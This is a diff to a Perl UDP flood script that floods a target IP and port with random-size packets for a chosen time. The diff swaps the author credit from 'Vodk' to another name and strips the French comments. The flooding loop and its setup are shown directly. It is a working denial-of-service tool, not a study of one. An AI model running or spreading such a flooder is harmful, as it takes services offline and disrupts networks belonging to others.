@@ -1,13 +1,13 @@
 #!/usr/bin/perl
 
 ##
-# cODING by Vodk 
+# by baptiste heraud
 ##
 
-use Socket; #on ouvre le socket
-use strict; #on ouvre le strict 
+use Socket;
+use strict; 
 
-my ($ip,$port,$size,$time) = @ARGV; #on recuprere l'ip 
+my ($ip,$port,$size,$time) = @ARGV; #on recuprere l'ip target
 
 my ($iaddr,$endtime,$psize,$pport);
 
@@ -19,8 +19,8 @@ print "Flooding $ip " . ($port ? $port : "random") . " port with " .
   ($size ? "$size-byte" : "random size") . " packets" .
   ($time ? " for $time seconds" : "") . "\n";
 print "Break with Ctrl-C\n" unless $time;
-#on flood
 
+#c'est partie !
 for (;time() <= $endtime;) {
   $psize = $size ? $size : int(rand(1024-64)+64) ;
   $pport = $port ? $port : int(rand(65500))+1;
